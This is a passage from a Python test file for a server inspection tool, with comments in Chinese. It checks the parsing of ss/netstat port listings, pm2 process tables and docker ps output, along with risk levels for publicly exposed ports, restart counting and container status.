    """J1 验证：用户 203.0.113.10 服务器实际 18 行真实数据，必须全部解析。

    数据包含：
    - [::]:5778、*:443、*:2379、*:80、*:22、*:9080、*:9000-9008 等
    - caddy/etcd/docker-proxy/sshd/promtail/risk/trader/puller/system/exchange/supplier/transaction/sender/strategy
    - 必须 listening_count == 18
    - etcd 2379 公网暴露 → HIGH 风险
    """
    out = (
        "---TOP---\n"
        "PID PPID USER     COMM    %CPU %MEM ARGS\n"
        "---TOP---\n"
        "PID PPID USER     COMM    %CPU %MEM ARGS\n"
        "---PORTS---\n"
        "Netid State  Recv-Q Send-Q   Local Address:Port   Peer Address:Port\n"
        "tcp   LISTEN 0      4096     [::]:5778              [::]:*                 users:((\"docker-proxy\",pid=2934948,fd=8))\n"
        "tcp   LISTEN 0      4096       *:443                *:*                   users:((\"caddy\",pid=23563,fd=20))\n"
        "tcp   LISTEN 0      4096       *:2379               *:*                   users:((\"etcd\",pid=52550,fd=7))\n"
        "tcp   LISTEN 0      4096     [::]:16686             [::]:*                users:((\"docker-proxy\",pid=2935072,fd=8))\n"
        "tcp   LISTEN 0      4096     [::]:4318              [::]:*                users:((\"docker-proxy\",pid=2934907,fd=8))\n"
        "tcp   LISTEN 0      4096     [::]:4317              [::]:*                users:((\"docker-proxy\",pid=2934888,fd=8))\n"
        "tcp   LISTEN 0      4096       *:80                 *:*                   users:((\"caddy\",pid=23563,fd=7))\n"
        "tcp   LISTEN 0      128      [::]:22                [::]:*                users:((\"sshd\",pid=706,fd=4))\n"
        "tcp   LISTEN 0      4096       *:9080               *:*                   users:((\"promtail-linux-\",pid=1785143,fd=8))\n"
        "tcp   LISTEN 0      4096       *:9008               *:*                   users:((\"risk\",pid=982700,fd=46))\n"
        "tcp   LISTEN 0      4096       *:9002               *:*                   users:((\"trader\",pid=2082197,fd=12))\n"
        "tcp   LISTEN 0      4096       *:9003               *:*                   users:((\"puller\",pid=3226047,fd=10))\n"
        "tcp   LISTEN 0      4096       *:9000               *:*                   users:((\"system\",pid=1229955,fd=15))\n"
        "tcp   LISTEN 0      4096       *:9001               *:*                   users:((\"exchange\",pid=1230417,fd=12))\n"
        "tcp   LISTEN 0      4096       *:9006               *:*                   users:((\"supplier\",pid=1975469,fd=11))\n"
        "tcp   LISTEN 0      4096       *:9007               *:*                   users:((\"transaction\",pid=3481059,fd=12))\n"
        "tcp   LISTEN 0      4096       *:9004               *:*                   users:((\"sender\",pid=3226656,fd=10))\n"
        "tcp   LISTEN 0      4096       *:9005               *:*                   users:((\"strategy\",pid=1976111,fd=12))\n"
    )
    r, s, m, sg, f = svc._analyze_process_ports(out, "", 0, {
        "PROCESS_PORT": {
            "high_risk_ports_high": [3306, 5432, 6379, 9200, 27017, 11211, 2379],
            "high_risk_ports_medium": [22, 80, 443, 8080, 8443, 9000, 9080],
        },
    })
    # J1 根因：18 行必须全部解析
    assert f["listening_count"] == 18, (
        f"J1: 18 行真实数据应全部解析; got {f['listening_count']}, msg={m}"
    )
    # 验证关键服务被识别
    services = {e["service"] for e in f["all_listening"]}
    assert "etcd" in services, f"J1: 应识别 etcd; got {services}"
    assert "caddy" in services, f"J1: 应识别 caddy; got {services}"
    assert "sshd" in services, f"J1: 应识别 sshd; got {services}"
    # 验证端口被识别
    ports = {e["port"] for e in f["all_listening"]}
    assert 2379 in ports, f"J1: 应识别 etcd 2379; got {ports}"
    assert 443 in ports, f"J1: 应识别 caddy 443; got {ports}"
    assert 22 in ports, f"J1: 应识别 sshd 22; got {ports}"
    # etcd 2379 公网暴露 → HIGH 风险
    assert r == "HIGH", f"J1: etcd 2379 公网暴露应 HIGH; got {r}, msg={m}"
    print(f"  PASS: J1 18 行真实数据全部解析（{f['listening_count']} 监听，{r}/{s}）")


def test_j1_real_screenshot_both_pcied():
    """J1 验证：bind 为 [::] 与 * 两种 IPv6/IPv4 通配符同时出现时全部识别。"""
    out = (
        "---PORTS---\n"
        "Netid State  Recv-Q Send-Q   Local Address:Port   Peer Address:Port\n"
        "tcp   LISTEN 0      4096     [::]:5778              [::]:*\n"
        "tcp   LISTEN 0      4096       *:443                *:*\n"
        "tcp   LISTEN 0      4096       *:2379               *:*\n"
        "tcp   LISTEN 0      4096     [::]:22                [::]:*\n"
        "tcp   LISTEN 0      4096       *:9080               *:*\n"
    )
    r, s, m, sg, f = svc._analyze_process_ports(out, "", 0, {
        "PROCESS_PORT": {
            "high_risk_ports_high": [2379],
            "high_risk_ports_medium": [22, 443, 9080],
        },
    })
    assert f["listening_count"] == 5, f"J1: 5 行无进程段应全解析; got {f['listening_count']}"
    # etcd 2379 → HIGH
    assert r == "HIGH", f"J1: etcd 2379 应 HIGH; got {r}"
    print(f"  PASS: J1 bind [::]/* 混合格式无进程段全解析（{f['listening_count']} 监听）")


def test_j2_no_ports_marker_still_parsed():
    """J2 根因：用户报告里 '原始输出 119 行 / 已解析 0 个' —— 真实 SSH 输出丢失 ---PORTS--- 标记。

    H1 修复在 in_ports=True 时能正确解析，但状态机在 in_ports=False 时漏掉整个 ss 段。
    J2 修复：auto-detect 端口行（特征：第一列 tcp/udp、第二列 LISTEN/UNCONN 等状态字、
    行内含 IP:Port 形式），与 marker 解耦。
    """
    out = (
        "Netid State  Recv-Q Send-Q   Local Address:Port   Peer Address:Port\n"
        "tcp   LISTEN 0      4096   127.0.0.53%lo:53       0.0.0.0:*    users:((\"systemd-resolve\",pid=535,fd=18))\n"
        "tcp   LISTEN 0      4096        0.0.0.0:5355        0.0.0.0:*    users:((\"systemd-resolve\",pid=535,fd=12))\n"
        "tcp   LISTEN 0      4096      127.0.0.1:27017        0.0.0.0:*    users:((\"mongod\",pid=401393,fd=9))\n"
        "tcp   LISTEN 0      4096      127.0.0.1:2380        0.0.0.0:*    users:((\"etcd\",pid=52550,fd=4))\n"
        "tcp   LISTEN 0      511         0.0.0.0:6379        0.0.0.0:*    users:((\"redis-server\",pid=3192097,fd=6))\n"
        "tcp   LISTEN 0      4096      127.0.0.1:2019        0.0.0.0:*    users:((\"caddy\",pid=23563,fd=18))\n"
        "tcp   LISTEN 0      128         0.0.0.0:22         0.0.0.0:*    users:((\"sshd\",pid=706,fd=3))\n"
        "udp   UNCONN 0      0           [::]:6831              [::]:*    users:((\"docker-proxy\",pid=2934969,fd=8))\n"
    )
    r, s, m, sg, f = svc._analyze_process_ports(out, "", 0, {
        "PROCESS_PORT": {
            "high_risk_ports_high": [6379, 27017, 2379],
            "high_risk_ports_medium": [22, 80, 443, 9000, 9080],
        },
    })
    # J2 根因：即使没有 ---PORTS--- 标记，8 行也应全部解析
    assert f["listening_count"] == 8, f"J2: 无 marker 8 行应全解析; got {f['listening_count']}, msg={m}"
    # redis 6379 公网暴露 → HIGH
    assert r == "HIGH", f"J2: redis 6379 公网暴露应 HIGH; got {r}, msg={m}"
    services = {e["service"] for e in f["all_listening"]}
    assert "etcd" in services, f"J2: 应识别 etcd; got {services}"
    assert "mongod" in services, f"J2: 应识别 mongod; got {services}"
    assert "redis-server" in services, f"J2: 应识别 redis-server; got {services}"
    print(f"  PASS: J2 无 marker 时 auto-detect 端口行全解析（{f['listening_count']} 监听，{r}/{s}）")


def test_j2_no_marker_with_ps_top_interleaved():
    """J2 验证：ps top 与 ss 行交错（用 ---TOP--- 标记）两者都正确处理。"""
    # 注意：J2 修复只解决端口行 auto-detect，ps top 仍然依赖 ---TOP--- marker
    out = (
        "---TOP---\n"
        "PID PPID USER     COMM    %CPU %MEM ARGS\n"
        "123456 1 root /usr/bin/some-daemon 5.0 1.0 /usr/bin/some-daemon --config /etc/some.conf\n"
        "tcp   LISTEN 0      4096        0.0.0.0:2379        0.0.0.0:*    users:((\"etcd\",pid=52550,fd=7))\n"
        "234567 1 root /usr/bin/other-daemon 3.0 1.5 /usr/bin/other-daemon\n"
        "tcp   LISTEN 0      4096      127.0.0.1:27017        0.0.0.0:*    users:((\"mongod\",pid=401393,fd=9))\n"
        "---PORTS---\n"
        "tcp   LISTEN 0      4096        0.0.0.0:6379        0.0.0.0:*    users:((\"redis-server\",pid=3192097,fd=6))\n"
    )
    r, s, m, sg, f = svc._analyze_process_ports(out, "", 0, {
        "PROCESS_PORT": {
            "high_risk_ports_high": [6379, 27017, 2379],
            "high_risk_ports_medium": [],
        },
    })
    # J2：交错时也能正确分离：ps top 2 条 + ports 3 条
    assert f["listening_count"] == 3, f"J2: 交错应 3 ports; got {f['listening_count']}, msg={m}"
    assert len(f["top_cpu_procs"]) == 2, f"J2: 应 2 ps 进程; got {len(f['top_cpu_procs'])}"
    print(f"  PASS: J2 ps/ss 交错 3 ports + 2 procs 正确分离")


def test_j2_netstat_no_marker_auto_detect():
    """J2 验证：netstat 输出（无 users 段）也走 auto-detect 路径。"""
    out = (
        "Active Internet connections (only servers)\n"
        "Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name\n"
        "tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1234/sshd\n"
        "tcp        0      0 0.0.0.0:6379            0.0.0.0:*               LISTEN      5678/redis-server\n"
        "udp        0      0 0.0.0.0:53              0.0.0.0:*               UNCONN      535/systemd-r\n"
    )
    r, s, m, sg, f = svc._analyze_process_ports(out, "", 0, {
        "PROCESS_PORT": {
            "high_risk_ports_high": [6379],
            "high_risk_ports_medium": [22],
        },
    })
    # J2：netstat 也能 auto-detect
    assert f["listening_count"] == 3, f"J2: netstat 3 行应全解析; got {f['listening_count']}, msg={m}"
    assert r == "HIGH", f"J2: redis 6379 → HIGH; got {r}"
    print(f"  PASS: J2 netstat 无 marker 也 auto-detect（{f['listening_count']} 监听，{r}/{s}）")


def test_j2_real_screenshot_no_marker_mimics_user():
    """J2 终极验证：完全模拟用户报告 119 行场景 —— 无 ---PORTS--- 标记、混有 ps top。

    用户截图（真实 19 行 ss 输出 + ps top + 表头）走 auto-detect 全部解析。
    """
    out = (
        "PID PPID USER     COMM    %CPU %MEM ARGS\n"
        "123 1 root /usr/sbin/sshd 0.0 0.1 /usr/sbin/sshd -D\n"
        "456 1 root /usr/sbin/dockerd 2.0 1.0 /usr/sbin/dockerd\n"
        "---TOP---\n"
        "PID PPID USER     COMM    %CPU %MEM ARGS\n"
        "123 1 root /usr/sbin/sshd 0.0 0.1 /usr/sbin/sshd -D\n"
        "456 1 root /usr/sbin/dockerd 2.0 1.0 /usr/sbin/dockerd\n"
        "Netid State  Recv-Q Send-Q   Local Address:Port   Peer Address:Port\n"
        "udp   UNCONN 0      0           [::]:6831              [::]:*    users:((\"docker-proxy\",pid=2934969,fd=8))\n"
        "udp   UNCONN 0      0           [::]:6832              [::]:*    users:((\"docker-proxy\",pid=2934990,fd=8))\n"
        "tcp   LISTEN 0      4096   127.0.0.53%lo:53       0.0.0.0:*    users:((\"systemd-resolve\",pid=535,fd=18))\n"
        "tcp   LISTEN 0      4096        0.0.0.0:5355        0.0.0.0:*    users:((\"systemd-resolve\",pid=535,fd=12))\n"
        "tcp   LISTEN 0      4096        0.0.0.0:9411        0.0.0.0:*    users:((\"docker-proxy\",pid=2935005,fd=8))\n"
        "tcp   LISTEN 0      4096      127.0.0.1:27017        0.0.0.0:*    users:((\"mongod\",pid=401393,fd=9))\n"
        "tcp   LISTEN 0      4096        0.0.0.0:5778        0.0.0.0:*    users:((\"docker-proxy\",pid=2934942,fd=8))\n"
        "tcp   LISTEN 0      4096      127.0.0.1:2380        0.0.0.0:*    users:((\"etcd\",pid=52550,fd=4))\n"
        "tcp   LISTEN 0      4096        0.0.0.0:16686       0.0.0.0:*    users:((\"docker-proxy\",pid=2935067,fd=8))\n"
        "tcp   LISTEN 0      511         0.0.0.0:6379        0.0.0.0:*    users:((\"redis-server\",pid=3192097,fd=6))\n"
        "tcp   LISTEN 0      4096        0.0.0.0:4318        0.0.0.0:*    users:((\"docker-proxy\",pid=2934902,fd=8))\n"
        "tcp   LISTEN 0      4096      127.0.0.1:2019        0.0.0.0:*    users:((\"caddy\",pid=23563,fd=18))\n"
        "tcp   LISTEN 0      128         0.0.0.0:22         0.0.0.0:*    users:((\"sshd\",pid=706,fd=3))\n"
    )
    r, s, m, sg, f = svc._analyze_process_ports(out, "", 0, {
        "PROCESS_PORT": {
            "high_risk_ports_high": [6379, 27017, 2379],
            "high_risk_ports_medium": [22, 80, 443, 9000, 9080],
        },
    })
    # J2 终极：13 行 ss（2 udp + 11 tcp）全部 auto-detect
    assert f["listening_count"] == 13, f"J2-终极: 13 行 ss 应全解析; got {f['listening_count']}, msg={m}"
    services = {e["service"] for e in f["all_listening"]}
    assert "etcd" in services and "mongod" in services and "redis-server" in services and "caddy" in services
    # redis 6379 公网暴露 → HIGH
    assert r == "HIGH", f"J2-终极: redis 6379 应 HIGH; got {r}, msg={m}"
    print(f"  PASS: J2-终极 {f['listening_count']} 监听 auto-detect（无 ---PORTS--- marker），{r}/{s}")


def test_j3_service_pm2_l_no_marker():
    """J3 根因：用户 SERVICE_STATUS 段同样丢失 ---PM2_JLIST--- marker，导致 pm2_present=False。

    用户截图实际输出 19 行：pm2 l 表格（hbbr/hbbs online + pm2-logrotate module），
    但 marker 缺失，原版解析为 0 个。
    J3 修复：auto-detect 兜底，当 PM2_JLIST 段为空时从整个 out 找 │/┌/├/└/Module 起始行。
    """
    out = (
        "pm2 l\n"
        "# 判定要点：基础服务异常、项目进程缺失、异常重启或失败单元。\n"
        "exit=0 duration_ms=332\n"
        "UNIT LOAD ACTIVE SUB DESCRIPTION\n"
        "0 loaded units listed.\n"
        "root      2499  2464  0  2025 ?       05:24:51 node /root/.pm2/modules/pm2-logrotate/node_modules/pm2-logrotate\n"
        "\n"
        "┌─────┬───────────────┬─────────────┬─────────┬─────────┬──────────┬────────┬──────┬───────────┬──────────┬──────────┬──────────┬──────────┐\n"
        "│ id  │ name          │ namespace   │ version │ mode    │ pid      │ uptime │ ↺    │ status    │ cpu      │ mem      │ user     │ watching │\n"
        "├─────┼───────────────┼─────────────┼─────────┼─────────┼──────────┼────────┼──────┼───────────┼──────────┼──────────┼──────────┼──────────┤\n"
        "│ 1   │ hbbr          │ default     │ N/A     │ fork    │ 64038    │ 6M     │ 1    │ online    │ 0%       │ 3.3mb    │ root     │ disabled │\n"
        "│ 2   │ hbbs          │ default     │ N/A     │ fork    │ 64046    │ 6M     │ 1    │ online    │ 0%       │ 3.3mb    │ root     │ disabled │\n"
        "└─────┴───────────────┴─────────────┴─────────┴─────────┴──────────┴────────┴──────┴───────────┴──────────┴──────────┴──────────┴──────────┘\n"
        "Module\n"
        "┌─────┬────────────────┬─────────────┬──────┬─────────┬──────┬──────┬──────────┐\n"
        "│ id  │ module         │ version     │ pid  │ status  │ ↺    │ cpu  │ mem      │\n"
        "├─────┼────────────────┼─────────────┼──────┼─────────┼──────┼──────┼──────────┤\n"
        "│ 0   │ pm2-logrotate  │ 3.0.0       │ 2499 │ online  │ 0    │ 0%   │ 84.0mb   │\n"
        "└─────┴────────────────┴─────────────┴──────┴─────────┴──────┴──────┴──────────┘\n"
    )
    r, s, m, sg, f = svc._analyze_service(out, "", 0, {
        "SERVICE_STATUS": {
            "watch_services": ["nginx", "caddy", "mysql", "mysqld", "postgresql", "redis", "etcd", "pm2"],
            "failed_unit_medium_count": 3,
            "pm2_stopped_level": "MEDIUM",
            "pm2_errored_level": "HIGH",
            "pm2_expected_processes": ["etcd", "exchange", "risk", "trader", "supplier"],
        },
    })
    # J3 根因：auto-detect 后必须有 PM2 数据
    assert f["pm2_present"] is True, f"J3: pm2_present 应 True; got {f['pm2_present']}, msg={m}"
    # hbbr、hbbs、pm2-logrotate module 都在 online
    assert f["pm2_online_count"] == 3, f"J3: 3 个 online (hbbr/hbbs/pm2-logrotate); got {f['pm2_online_count']}, msg={m}"
    assert f["pm2_stopped"] == [], f"J3: 不应有 stopped; got {f['pm2_stopped']}"
    # 风险：3 个 online，watch 中无 active 信息 → PASS
    assert r == "NONE", f"J3: 全 online 应 PASS; got {r}, msg={m}"
    assert s == "PASS"
    print(f"  PASS: J3 pm2 l 无 marker 时 auto-detect（pm2_online={f['pm2_online_count']}，{r}/{s}）")


def test_j3_service_with_marker_still_works():
    """J3 验证：当 ---PM2_JLIST--- marker 存在时，原路径仍然正确工作（不破坏既有逻辑）。"""
    out = (
        "---SYSTEMD_FAILED---\n"
        "0 loaded units listed.\n"
        "---SYSTEMD_ACTIVE---\n"
        "nginx: active\n"
        "redis: active\n"
        "---PM2_JLIST---\n"
        "[{\"name\":\"etcd\",\"pm2_env\":{\"status\":\"online\",\"restart_time\":0},\"pid\":1234}]\n"
        "---PM2_PING---\n"
        "PM2_PING_OK\n"
        "---ETCD_HEALTH---\n"
        "{\"ID\":1,\"endpoint\":\"http://localhost:2379\",\"status\":{\"health\":\"true\"}}\n"
        "---PROCESS_KEYWORDS---\n"
        "1234 root etcd\n"
    )
    r, s, m, sg, f = svc._analyze_service(out, "", 0, {
        "SERVICE_STATUS": {
            "watch_services": ["nginx", "redis"],
            "pm2_expected_processes": ["etcd"],
        },
    })
    # 有 marker 路径：pm2_present=True + online=1 + etcd_healthy=1
    assert f["pm2_present"] is True
    assert f["pm2_online_count"] == 1
    assert len(f["etcd_healthy"]) == 1
    assert f["pm2_ping_ok"] is True
    print(f"  PASS: J3 有 marker 时原路径不受影响（pm2_online={f['pm2_online_count']}，etcd_healthy={len(f['etcd_healthy'])}）")


def test_j4_parse_pm2_uptime_seconds():
    """J4 验证：_parse_pm2_uptime_seconds 解析 PM2 uptime 列各种格式。"""
    from app.services.inspection_center import _parse_pm2_uptime_seconds
    assert _parse_pm2_uptime_seconds("5s") == 5
    assert _parse_pm2_uptime_seconds("30m") == 1800
    assert _parse_pm2_uptime_seconds("2h") == 7200
    assert _parse_pm2_uptime_seconds("3D") == 259200
    assert _parse_pm2_uptime_seconds("0") == 0
    assert _parse_pm2_uptime_seconds("") == -1
    assert _parse_pm2_uptime_seconds("abc") == -1
    assert _parse_pm2_uptime_seconds("6M") == 2592000 * 6
    assert _parse_pm2_uptime_seconds("1Y") == 31536000
    print("  PASS: J4 _parse_pm2_uptime_seconds 各种格式全部正确")


def test_j4_pm2_recent_restarts_in_24h():
    """J4 根因：用户新增规则 —— PM2 进程 24h 内（uptime < 24h）且 restarts ≥ 1 应记入重启统计。

    数据：3 个 PM2 进程
    - etcd: uptime 4M + restarts 3 → 24h 内重启，计数 3 次
    - exchange: uptime 2D + restarts 1 → 超过 24h，不计数
    - monitor: uptime 30m + restarts 0 → 24h 内但无重启，不计数
    """
    out = (
        "---PM2_JLIST---\n"
        "┌─────┬───────────────┬─────────────┬─────────┬─────────┬──────────┬────────┬──────┬───────────┬──────────┬──────────┬──────────┬──────────┐\n"
        "│ id  │ name          │ namespace   │ version │ mode    │ pid      │ uptime │ ↺    │ status    │ cpu      │ mem      │ user     │ watching │\n"
        "├─────┼───────────────┼─────────────┼─────────┼─────────┼──────────┼────────┼──────┼───────────┼──────────┼──────────┼──────────┼──────────┤\n"
        "│ 1   │ etcd          │ default     │ N/A     │ fork    │ 52549    │ 4m     │ 3    │ online    │ 0%       │ 3.3mb    │ root     │ disabled │\n"
        "│ 5   │ exchange      │ default     │ N/A     │ fork    │ 12304    │ 2D     │ 1    │ online    │ 0%       │ 3.3mb    │ root     │ disabled │\n"
        "│ 9   │ monitor       │ default     │ N/A     │ fork    │ 32272    │ 30m    │ 0    │ online    │ 0%       │ 3.3mb    │ root     │ disabled │\n"
        "└─────┴───────────────┴─────────────┴─────────┴─────────┴──────────┴────────┴──────┴───────────┴──────────┴──────────┴──────────┴──────────┘\n"
    )
    r, s, m, sg, f = svc._analyze_service(out, "", 0, {
        "SERVICE_STATUS": {
            "watch_services": ["nginx", "caddy", "pm2"],
            "pm2_expected_processes": ["etcd", "exchange", "monitor"],
        },
    })
    # J4：只 etcd 满足 24h + restarts≥1
    assert len(f["pm2_recent_restarts"]) == 1, f"J4: 应 1 个 recent restart; got {len(f['pm2_recent_restarts'])}, msg={m}"
    assert f["pm2_recent_restarts"][0]["name"] == "etcd"
    assert f["pm2_recent_restarts"][0]["restarts"] == 3
    assert f["pm2_total_recent_restarts"] == 3
    # MEDIUM 风险（default recent_restart_level）
    assert r == "MEDIUM", f"J4: etcd 24h 内重启 3 次应 MEDIUM; got {r}, msg={m}"
    assert s == "WARNING"
    assert "最近 24h" in m, f"J4: msg 应提'24h'; got {m}"
    assert "etcd" in m
    print(f"  PASS: J4 24h 内重启统计 1 进程累计 3 次 → {r}/{s}")


def test_j4_recent_restart_level_configurable():
    """J4 验证：通过 cfg.recent_restart_level 调整等级。"""
    out = (
        "---PM2_JLIST---\n"
        "│ 1   │ trader        │ default     │ N/A     │ fork    │ 20821    │ 10m    │ 5    │ online    │ 0%       │ 3.3mb    │ root     │ disabled │\n"
    )
    # HIGH 等级
    r, _, m, _, f = svc._analyze_service(out, "", 0, {
        "SERVICE_STATUS": {
            "pm2_expected_processes": ["trader"],
            "recent_restart_level": "HIGH",
        },
    })
    assert r == "HIGH", f"J4: cfg=HIGH 应 HIGH; got {r}, msg={m}"
    assert f["pm2_total_recent_restarts"] == 5
    # LOW 等级
    r, _, m, _, _ = svc._analyze_service(out, "", 0, {
        "SERVICE_STATUS": {
            "pm2_expected_processes": ["trader"],
            "recent_restart_level": "LOW",
        },
    })
    assert r == "LOW", f"J4: cfg=LOW 应 LOW; got {r}, msg={m}"
    print("  PASS: J4 cfg.recent_restart_level 等级可配（HIGH/MEDIUM/LOW）")


def test_j4_old_restarts_30d_not_counted():
    """J4 验证：uptime 超过 24h 的进程即使 restarts≥1 也不计入 recent（避免历史重启误报）。"""
    out = (
        "---PM2_JLIST---\n"
        "│ 1   │ long-running  │ default     │ N/A     │ fork    │ 1000     │ 30D    │ 7    │ online    │ 0%       │ 3.3mb    │ root     │ disabled │\n"
    )
    r, s, m, sg, f = svc._analyze_service(out, "", 0, {
        "SERVICE_STATUS": {
            "pm2_expected_processes": ["long-running"],
        },
    })
    # 30D 远大于 24h → 不计数
    assert f["pm2_recent_restarts"] == [], f"J4: 30D uptime 不应计入; got {f['pm2_recent_restarts']}"
    assert f["pm2_total_recent_restarts"] == 0
    # 无风险 → PASS
    assert r == "NONE", f"J4: 无近期重启应 PASS; got {r}, msg={m}"
    assert s == "PASS"
    print("  PASS: J4 uptime 30D 即使 restarts=7 也不计入 24h 统计")


def test_j4_default_window_changeable():
    """J4 验证：recent_restart_hours 可调（默认 24h，可设为 1h/72h）。"""
    out = (
        "---PM2_JLIST---\n"
        "│ 1   │ svc-a         │ default     │ N/A     │ fork    │ 1000     │ 5h     │ 2    │ online    │ 0%       │ 3.3mb    │ root     │ disabled │\n"
    )
    # 默认 24h：5h < 24h，计数
    r1, _, m1, _, f1 = svc._analyze_service(out, "", 0, {
        "SERVICE_STATUS": {"pm2_expected_processes": ["svc-a"]},
    })
    assert f1["pm2_total_recent_restarts"] == 2, "默认 24h 应计数"
    # 1h：5h > 1h，不计数
    r2, _, m2, _, f2 = svc._analyze_service(out, "", 0, {
        "SERVICE_STATUS": {"pm2_expected_processes": ["svc-a"], "recent_restart_hours": 1},
    })
    assert f2["pm2_total_recent_restarts"] == 0, "1h 窗口下 5h uptime 不应计数"
    assert f2["recent_restart_hours"] == 1
    # 72h：5h < 72h，计数
    r3, _, m3, _, f3 = svc._analyze_service(out, "", 0, {
        "SERVICE_STATUS": {"pm2_expected_processes": ["svc-a"], "recent_restart_hours": 72},
    })
    assert f3["pm2_total_recent_restarts"] == 2, "72h 窗口下 5h 应计数"
    print("  PASS: J4 recent_restart_hours 窗口可配（默认 24h）")


def test_j4_pass_summary_includes_restart_count():
    """J4 验证：全 PASS 时 summary 包含重启统计（信息性），msg 也提重启次数。"""
    out = (
        "---PM2_JLIST---\n"
        "│ 1   │ stable-svc    │ default     │ N/A     │ fork    │ 1000     │ 5h     │ 1    │ online    │ 0%       │ 3.3mb    │ root     │ disabled │\n"
    )
    r, s, m, sg, f = svc._analyze_service(out, "", 0, {
        "SERVICE_STATUS": {
            "pm2_expected_processes": ["stable-svc"],
            # 强制升级到 MEDIUM，但只测 summary
            "recent_restart_level": "HIGH",
        },
    })
    # HIGH 等级下应当为 RISK
    assert r == "HIGH", f"J4: HIGH level 应 RISK; got {r}, msg={m}"
    assert s == "RISK"
    assert f["pm2_total_recent_restarts"] == 1
    assert "stable-svc" in m
    print(f"  PASS: J4 升级后 summary 包含 24h 重启统计（{f['pm2_total_recent_restarts']} 次）")


# ============================================================
# E5 - Docker 容器托管识别（PM2 迁移到 Docker 容器场景）
# ============================================================

_BASE_SERVICE_OUT = (
    "---SYSTEMD_FAILED---\n0 loaded units listed.\n"
    "---SYSTEMD_ACTIVE---\n"
    "nginx: active\n"
    "---PM2_JLIST---\nPM2_NOT_FOUND\n"
    "---PM2_PING---\nPM2_PING_OK\n"
    "---ETCD_HEALTH---\nhttp://localhost:2379 is healthy: successfully committed proposal\n"
    "---DOCKER_PS---\n"
    "exchange|exchange:latest|Up 2 hours\n"
    "risk|risk:latest|Up 2 hours\n"
    "---PROCESS_KEYWORDS---\n"
)


def test_e5_docker_running_service_not_missing():
    """E5: 服务迁移到 Docker 容器后（PM2 已移除），不应被判定为缺失。"""
    import json
    # 期望进程 exchange/risk 已从 PM2 移除，改由 Docker 容器运行
    out = (
        "---SYSTEMD_FAILED---\n0 loaded units listed.\n"
        "---SYSTEMD_ACTIVE---\n"
        "---PM2_JLIST---\n" + json.dumps([
            {"name": "etcd", "pm2_env": {"status": "online", "restart_time": 0}, "pid": 1},
        ]) + "\n"
        "---PM2_PING---\nPM2_PING_OK\n"
        "---ETCD_HEALTH---\nhttp://localhost:2379 is healthy: successfully committed proposal\n"
        "---DOCKER_PS---\n"
        "exchange|exchange:latest|Up 2 hours\n"
        "risk|risk:latest|Up 2 hours\n"
        "---PROCESS_KEYWORDS---\n"
    )
    r, s, m, sg, f = svc._analyze_service(out, "", 0, {})
    assert r == "NONE", f"E5: Docker 托管服务不应误报; got {r}, msg={m}"
    assert f["docker_present"] is True
    assert f["docker_running"] == ["exchange", "risk"]
    assert f["pm2_errored"] == []
    assert f["pm2_stopped"] == []
    print("  PASS: E5 服务由 PM2 迁移到 Docker 容器后通过（不误报缺失）")


def test_e5_docker_running_suppresses_pm2_stopped():
    """E5: 迁移中——服务在 PM2 标记 stopped 但同名 Docker 容器在运行 → 不告警。"""
    import json
    out = (
        "---SYSTEMD_FAILED---\n0 loaded units listed.\n"
        "---SYSTEMD_ACTIVE---\n"
        "---PM2_JLIST---\n" + json.dumps([
            {"name": "exchange", "pm2_env": {"status": "stopped", "restart_time": 4}, "pid": 0},
            {"name": "etcd", "pm2_env": {"status": "online", "restart_time": 0}, "pid": 1},
        ]) + "\n"
        "---PM2_PING---\nPM2_PING_OK\n"
        "---ETCD_HEALTH---\nhttp://localhost:2379 is healthy: successfully committed proposal\n"
        "---DOCKER_PS---\n"
        "exchange|exchange:latest|Up 2 hours\n"
        "---PROCESS_KEYWORDS---\n"
    )
    r, s, m, sg, f = svc._analyze_service(out, "", 0, {})
    # exchange 已由 Docker 容器运行，PM2 中 stopped 不应触发告警 → 仅 etcd online → PASS
    assert r == "NONE", f"E5: Docker 运行的同名 PM2 stopped 应被抑制; got {r}, msg={m}"
    assert f["pm2_stopped"] == [{"name": "exchange", "pid": 0}]  # facts 保留原始
    print("  PASS: E5 Docker 运行中的同名 PM2 stopped 被抑制为 PASS")


def test_e5_docker_restarting_medium():
    """E5: Docker 容器崩溃循环 Restarting → MEDIUM。"""
    out = _BASE_SERVICE_OUT.replace(
        "exchange|exchange:latest|Up 2 hours",
        "exchange|exchange:latest|Restarting (1) 5 seconds ago",
    )
    r, s, m, sg, f = svc._analyze_service(out, "", 0, {})
    assert r == "MEDIUM", f"E5: Restarting 容器应 MEDIUM; got {r}, msg={m}"
    assert f["docker_restarting"] == ["exchange"]
    assert "Restarting" in m
    print("  PASS: E5 Docker Restarting 崩溃循环 → MEDIUM")


def test_e5_docker_exited_expected_low():
    """E5: 期望常驻的 Docker 容器 Exited → LOW。"""
    out = _BASE_SERVICE_OUT.replace(
        "exchange|exchange:latest|Up 2 hours",
        "exchange|exchange:latest|Exited (0) 2 hours ago",
    )
    r, s, m, sg, f = svc._analyze_service(out, "", 0, {
        "SERVICE_STATUS": {"docker_expected_containers": ["exchange"]},
    })
    assert r == "LOW", f"E5: 期望容器 Exited 应 LOW; got {r}, msg={m}"
    assert f["docker_exited"] == ["exchange"]
    assert "Exited" in m
    print("  PASS: E5 期望 Docker 容器 Exited → LOW")


def test_e5_docker_unexpected_exited_not_flagged():
    """E5: 非期望的 Docker 容器 Exited（如辅助/一次性容器）应忽略，不告警。"""
    out = _BASE_SERVICE_OUT.replace(
        "exchange|exchange:latest|Up 2 hours",
        "some-helper|busybox:latest|Exited (0) 2 hours ago",
    )
    r, s, m, sg, f = svc._analyze_service(out, "", 0, {
        "SERVICE_STATUS": {"docker_expected_containers": ["exchange", "risk"]},
    })
    # some-helper 不在期望列表 → 不告警；exchange/risk 正常 Up → PASS
    assert r == "NONE", f"E5: 非期望 Exited 容器应忽略; got {r}, msg={m}"
    assert f["docker_exited"] == ["some-helper"]
    print("  PASS: E5 非期望 Docker 容器 Exited 被忽略")


def test_e5_docker_config_defaults_include_keys():
    """E5: DEFAULT_THRESHOLDS.SERVICE_STATUS 必须含 Docker 相关字段。"""
    cfg = svc.DEFAULT_THRESHOLDS["SERVICE_STATUS"]
    for key in ("docker_restarting_level", "docker_exited_level", "docker_expected_containers"):
        assert key in cfg, f"E5: SERVICE_STATUS missing {key}"
    assert cfg["docker_restarting_level"] == "MEDIUM"
    assert cfg["docker_exited_level"] == "LOW"
    print("  PASS: E5 SERVICE_STATUS 含 3 个 Docker 字段（docker_*/docker_expected_containers）")


